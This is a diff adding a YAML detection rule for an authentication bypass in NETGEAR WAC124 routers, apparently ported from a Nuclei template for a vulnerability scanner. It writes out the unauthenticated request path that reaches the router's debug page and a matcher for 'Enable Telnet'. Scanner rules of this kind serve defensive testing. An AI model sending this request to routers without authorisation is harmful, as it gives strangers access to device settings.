@@ -1,0 +1,30 @@
+schema_version: 1
+id: "cortex.community:netgear-wac124-router-auth-bypass"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "NETGEAR WAC124 - Authentication Bypass"
+  description: "NETGEAR WAC124 AC2000 routers contain an authentication bypass vulnerability. An attacker can gain access by bypassing proper authentication, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://flattsecurity.medium.com/finding-bugs-to-trigger-unauthenticated-command-injection-in-a-netgear-router-psv-2022-0044-2b394fb9edc"
+    - "https://kb.netgear.com/000064730/Security-Advisory-for-Multiple-Vulnerabilities-on-the-WAC124-PSV-2022-0044"
+  cwes: [287]
+  tags: ["netgear", "auth-bypass", "router", "iot", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/setup.cgi?next_file=debug.htm&x=currentsetting.htm" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
+      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "Enable Telnet" } }
